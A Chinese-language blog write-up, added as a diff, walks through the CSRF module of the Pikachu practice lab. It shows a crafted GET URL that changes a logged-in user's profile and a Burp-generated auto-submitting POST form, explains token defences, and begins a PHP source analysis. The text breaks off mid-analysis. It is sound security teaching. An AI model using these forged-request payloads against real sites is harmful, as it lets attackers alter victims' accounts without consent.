@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pikachu靶场通关：CSRF | Qu0rtz-blip 的博客</title><meta name="author" content="Qu0rtz-blip"><meta name="copyright" content="Qu0rtz-blip"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="皮卡丘（Pikachu）CSRF 跨站请求伪造通关记录 实验环境：Windows 10 + Pikachu + Edge &#x2F; Burp Suite靶场地址：http:&#x2F;&#x2F;10.33.20.10&#x2F;pikachu&#x2F;   本次记录皮卡丘靶场 CSRF 模块全部 3 个小关卡的通关过程。这一关的靶场对象是一个”个人会员中心”，可以修改性别、手机、住址、邮箱——现实生活中对应的场景是转账、改密码、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu靶场通关：CSRF">
+<meta property="og:url" content="https://qu0rtz-blip.github.io/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/index.html">
+<meta property="og:site_name" content="Qu0rtz-blip 的博客">
+<meta property="og:description" content="皮卡丘（Pikachu）CSRF 跨站请求伪造通关记录 实验环境：Windows 10 + Pikachu + Edge &#x2F; Burp Suite靶场地址：http:&#x2F;&#x2F;10.33.20.10&#x2F;pikachu&#x2F;   本次记录皮卡丘靶场 CSRF 模块全部 3 个小关卡的通关过程。这一关的靶场对象是一个”个人会员中心”，可以修改性别、手机、住址、邮箱——现实生活中对应的场景是转账、改密码、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qu0rtz-blip.github.io/img/cover-4.jpg">
+<meta property="article:published_time" content="2026-11-12T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-12T04:06:04.005Z">
+<meta property="article:author" content="Qu0rtz-blip">
+<meta property="article:tag" content="Pikachu靶场">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="跨站请求伪造">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qu0rtz-blip.github.io/img/cover-4.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pikachu靶场通关：CSRF",
+  "url": "https://qu0rtz-blip.github.io/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/",
+  "image": "https://qu0rtz-blip.github.io/img/cover-4.jpg",
+  "datePublished": "2026-11-12T04:00:00.000Z",
+  "dateModified": "2026-11-12T04:06:04.005Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Qu0rtz-blip",
+      "url": "https://qu0rtz-blip.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://qu0rtz-blip.github.io/2026/11/12/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        try {
+          const data = { value }
+
+          if (ttl != null) {
+            data.expiry = Date.now() + ttl * 86400000
+          }
+
+          localStorage.setItem(key, JSON.stringify(data))
+        } catch (e) {
+          console.error(e)
+        }
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pikachu靶场通关：CSRF',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg-site.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/cover-4.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Qu0rtz-blip 的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">Pikachu靶场通关：CSRF</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Pikachu靶场通关：CSRF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-12T04:00:00.000Z" title="发表于 2026-11-12 12:00:00">2026-11-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-12T04:06:04.005Z" title="更新于 2026-11-12 12:06:04">2026-11-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="皮卡丘（Pikachu）CSRF-跨站请求伪造通关记录"><a href="#皮卡丘（Pikachu）CSRF-跨站请求伪造通关记录" class="headerlink" title="皮卡丘（Pikachu）CSRF 跨站请求伪造通关记录"></a>皮卡丘（Pikachu）CSRF 跨站请求伪造通关记录</h1><blockquote>
+<p><strong>实验环境</strong>：Windows 10 + Pikachu + Edge &#x2F; Burp Suite<br><strong>靶场地址</strong>：<code>http://10.33.20.10/pikachu/</code></p>
+</blockquote>
+<blockquote>
+<p>本次记录皮卡丘靶场 CSRF 模块全部 3 个小关卡的通关过程。<br>这一关的靶场对象是一个”个人会员中心”，可以修改性别、手机、住址、邮箱——现实生活中对应的场景是转账、改密码、加管理员。<br>三关递进：GET 型 → POST 型 → Token 防护，前两关打穿，第三关用来回答”到底什么才算防住了 CSRF”。</p>
+</blockquote>
+<hr>
+<h2 id="一、CSRF-跨站请求伪造"><a href="#一、CSRF-跨站请求伪造" class="headerlink" title="一、CSRF 跨站请求伪造"></a>一、CSRF 跨站请求伪造</h2><p>CSRF（Cross-Site Request Forgery）的本质是<strong>借用受害者的登录态，替他发一个他自己不知道的请求</strong>。</p>
+<p>它成立需要三个条件同时满足：</p>
+<table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>① 用户已登录</td>
+<td>浏览器里存着目标站点的有效 Cookie &#x2F; Session</td>
+</tr>
+<tr>
+<td>② 请求可被跨站构造</td>
+<td>参数全部可预测（GET 拼 URL、POST 拼表单），无需用户输入任何秘密</td>
+</tr>
+<tr>
+<td>③ 服务端只看 Cookie</td>
+<td>只凭 Cookie 认人，不校验请求是否来自本站页面、也不校验一次性令牌</td>
+</tr>
+</tbody></table>
+<p>三者的关系是：<strong>Cookie 是浏览器自动附带的，攻击者控制不了它，但也不需要控制它</strong>——只要诱骗受害者在他自己的浏览器里发请求，浏览器就会乖乖把 Cookie 带上。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">① 受害者登录目标站点，拿到 Cookie</span><br><span class="line">        ↓</span><br><span class="line">② 攻击者构造恶意页面 / 链接（参数固定，无需知道密码）</span><br><span class="line">        ↓</span><br><span class="line">③ 受害者访问，浏览器自动携带 Cookie 向目标站点发请求</span><br><span class="line">        ↓</span><br><span class="line">④ 服务端看到合法 Cookie → 认为是本人操作 → 执行</span><br></pre></td></tr></table></figure>
+
+<p><strong>与 XSS 的区别</strong>（两者经常被混为一谈）：</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>XSS</th>
+<th>CSRF</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>信任被谁利用</td>
+<td>用户对站点的信任（在站点里执行我的代码）</td>
+<td>站点对用户浏览器的信任（借用用户的 Cookie）</td>
+</tr>
+<tr>
+<td>是否需要登录态</td>
+<td>不一定</td>
+<td>必须</td>
+</tr>
+<tr>
+<td>攻击者能否读到响应</td>
+<td>能</td>
+<td>不能（浏览器同源策略的限制）</td>
+</tr>
+<tr>
+<td>防御核心</td>
+<td>输出编码</td>
+<td>证明”请求是本人主动发的”</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="二、通关记录"><a href="#二、通关记录" class="headerlink" title="二、通关记录"></a>二、通关记录</h2><p>三关入口：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.33.20.10/pikachu/vul/csrf/csrfget/csrf_get.php</span><br><span class="line">http://10.33.20.10/pikachu/vul/csrf/csrfpost/csrf_post.php</span><br><span class="line">http://10.33.20.10/pikachu/vul/csrf/csrftoken/token_get.php</span><br></pre></td></tr></table></figure>
+
+<p>登录账号页面 tips 已经给了：<code>vince / allen / kobe / grady / kevin / lucy / lili</code>，密码统一 <code>123456</code>。</p>
+<h3 id="2-1-CSRF-get"><a href="#2-1-CSRF-get" class="headerlink" title="2.1 CSRF(get)"></a>2.1 CSRF(get)</h3><p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/01-get_login.png"></p>
+<p>用 <code>vince / 123456</code> 登录，进入个人会员中心，能看到当前信息：</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/02-get_info.png"></p>
+<p>点「修改个人信息」，随手填一组数据提交：</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/03-get_edit.png"></p>
+<p><strong>抓包</strong>：请求方法 <code>GET</code>，四个参数全部拼在 URL 上：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://10.33.20.10/pikachu/vul/csrf/csrfget/csrf_get_edit.php</span><br><span class="line">  ?sex=boy</span><br><span class="line">  &amp;phonenum=988888</span><br><span class="line">  &amp;add=china</span><br><span class="line">  &amp;email=hacker@163.com</span><br><span class="line">  &amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/04-get_burp.png"></p>
+<p>GET 型的利用最省事：<strong>把这条 URL 的参数改成任意值，直接访问即可</strong>。不需要表单，不需要 JS，一个链接就行：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.33.20.10/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=988888&amp;add=china&amp;email=hacker@evil.com&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>保持登录状态访问这个链接，再回个人中心：</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/05-get_success.png"></p>
+<p>信息全被改掉了。整个过程中，受害者只是”点了一个链接”。</p>
+<h3 id="2-2-CSRF-post"><a href="#2-2-CSRF-post" class="headerlink" title="2.2 CSRF(post)"></a>2.2 CSRF(post)</h3><p>第二关把表单方法换成了 POST，参数进了请求体：</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/06-post_burp.png"></p>
+<p>URL 拼参数这条路走不通了，需要在自己的页面上放一个表单，让它自动提交。</p>
+<p><strong>方法一</strong>：Burp 里右键该请求 → <code>Engagement tools</code> → <code>Generate CSRF PoC</code>，自动生成表单页面。</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/06-post_burp_tool.png"></p>
+<p>点击<code>Generate CSRF PoC</code>，修改值</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/06-post_burp_poc_gen.png"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://10.34.113.227:8081/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;boy&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;987456&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;beijing&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker<span class="symbol">&amp;#64;</span>163<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>CSRF 的定义是“跨站”请求伪造。在真实环境中，恶意页面在攻击者的服务器（如 <code>evil.com</code>），受害者在目标网站（如 <code>bank.com</code>）。攻击者生成链接（如<code>http://evil.com/csrf.html</code>）后诱导受害者点击，受害者点击后，跨站发出请求，从而实现攻击。</p>
+<p>因此，我将生成的 PoC 文件放入靶场的 Web 目录（<code>/csrf/</code> 下）。虽然此时页面和目标接口是同源的，但这模拟了恶意页面在网络环境中自动向目标接口发送 POST 请求的过程。无论攻击页面是在同源目录还是跨站环境，CSRF 的核心利用链（浏览器自动携带 Cookie + 服务端未校验请求来源）是不变的。</p>
+<p>由于我是用docker拉的靶场，这里只讲关于docker的。</p>
+<p>使用 docker cp 命令，将文件复制到靶场目录，如：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> &lt;物理机上csrf.html文件位置&gt; &lt;容器ID&gt;:/app/vul/csrf/csrf_poc.html</span><br></pre></td></tr></table></figure>
+
+<p>再通过 URL 进行访问。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.34.113.227:8081/vul/csrf/csrf_poc.html</span><br></pre></td></tr></table></figure>
+
+<p>注意Apache 的网站根目录（DocumentRoot）就是 <code>/app</code>，所以 URL 里：</p>
+<ul>
+<li>不出现容器 ID</li>
+<li>不出现 <code>/app</code> 前缀</li>
+</ul>
+<p>打开页面，点击提交。回个人中心确认，信息已被改写：</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/08-post_success.png"></p>
+<p>这里还有一个方法，进入存放<code>csrf.html</code>文件的文件夹，右键打开终端，输入</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-m</span> http.server <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p>这样我们就创建了一个地址为<code>http://127.0.0.1:8888</code>的简易 Web 服务器。</p>
+<p>在浏览器里再打开一个新的标签页，输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/csrf.html</span><br></pre></td></tr></table></figure>
+
+<p>回车后点击提交按钮，看到 allen 的信息被改写</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/08-post_success_allen.png"></p>
+<h3 id="2-3-CSRF-token"><a href="#2-3-CSRF-token" class="headerlink" title="2.3 CSRF(token)"></a>2.3 CSRF(token)</h3><p>第三关页面看起来和第一关一模一样，但抓包会发现请求里多了一个<code>token</code>字段：</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-CSRF/09-token_burp.png"></p>
+<p>这里没有正确的 token，伪造请求打不进去。这是防范 CSRF 攻击的一种标准手段。</p>
+<p>服务端为当前会话生成不可预测的 Token，并将其渲染到页面或通过受同源保护的接口提供给前端。每次修改状态的请求都必须携带该 Token，服务端验证后才执行操作。</p>
+<p>攻击站点受同源策略的限制既不能读取目标网站页面，也不能读取 Token，因此无法构造通过校验的请求。Token 必须防泄露；若存在 XSS ，攻击者可能读取 Token，因此仍需防范 XSS。</p>
+<hr>
+<h2 id="三、源码分析"><a href="#三、源码分析" class="headerlink" title="三、源码分析"></a>三、源码分析</h2><h3 id="3-1-身份验证完全靠-Session-Cookie"><a href="#3-1-身份验证完全靠-Session-Cookie" class="headerlink" title="3.1 身份验证完全靠 Session Cookie"></a>3.1 身份验证完全靠 Session Cookie</h3><p>三个页面开头都有同一段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">check_csrf_login</span>(<span class="variable">$link</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:csrf_get_login.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>csrf_get_login.php</code> 的实现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="comment">//转义，防注入</span></span><br><span class="line">        <span class="variable">$username</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">        <span class="variable">$password</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;select * from member where username=&#x27;<span class="subst">$username</span>&#x27; and pw=md5(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>][<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$username</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>][<span class="string">&#x27;password&#x27;</span>]=<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:csrf_get.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;登录失败,请重新登录&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用户输入用户名密码  –&gt; 查数据库 –&gt; 对的上就往<code>_$SESSION</code>里写入用户名和密码 –&gt; 跳转去个人中心</p>
+<p>再看修改资料的</p>
+<p><code>csrf_get_login.php</code>GET 版的处理逻辑：</p>
